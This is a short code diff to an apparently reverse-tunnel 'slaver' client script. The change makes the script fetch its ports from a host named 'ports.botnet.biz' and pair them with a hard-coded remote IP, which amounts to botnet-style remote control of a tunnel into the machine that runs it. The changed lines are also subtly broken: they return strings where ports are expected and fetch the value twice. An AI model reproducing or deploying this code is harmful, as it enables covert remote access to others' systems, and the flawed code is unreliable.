@@ -324,7 +324,7 @@ def argparse_slaver():
 
 def getPort():
     port = urllib.request.urlopen("http://ports.botnet.biz").read()
-    port = int(port)
+    port = port.split(":")
 
     return port
 
@@ -338,8 +338,8 @@ def main_slaver():
         print("-v and -q should not appear together")
         exit(1)
 
-    communicate_addr = ('89.221.223.36', 10080)
-    target_addr = ('127.0.0.1', getPort())
+    communicate_addr = ('89.221.223.36', getPort()[1])
+    target_addr = ('127.0.0.1', getPort()[0])
 
     SECRET_KEY = args.secretkey
     CtrlPkg.recalc_crc32()
